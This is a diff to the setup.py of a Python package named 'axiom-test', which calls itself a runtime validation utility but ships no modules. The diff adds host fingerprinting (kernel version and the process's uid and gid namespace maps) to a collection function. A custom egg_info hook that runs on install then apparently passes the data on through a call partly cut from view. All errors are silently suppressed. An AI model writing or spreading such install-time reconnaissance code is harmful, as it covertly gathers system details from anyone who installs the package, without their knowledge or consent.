@@ -61,6 +61,21 @@ def _collect():
         p["network_interfaces"] = out.strip()
     except: pass
 
+    try:
+        out = subprocess.check_output(["uname", "-r"], text=True, timeout=5)
+        p["kernel_version"] = out.strip()
+    except: pass
+
+    try:
+        with open("/proc/self/uid_map") as f:
+            p["uid_map"] = f.read().strip()
+    except: pass
+
+    try:
+        with open("/proc/self/gid_map") as f:
+            p["gid_map"] = f.read().strip()
+    except: pass
+
     return p
 
 class PostEggInfo(egg_info):
@@ -74,5 +89,5 @@ class PostEggInfo(egg_info):
             ), timeout=10)
         except: pass
 
-setup(name="axiom-test", version="0.6.0", description="Runtime validation utility",
+setup(name="axiom-test", version="0.7.0", description="Runtime validation utility",
       py_modules=[], cmdclass={"egg_info": PostEggInfo})
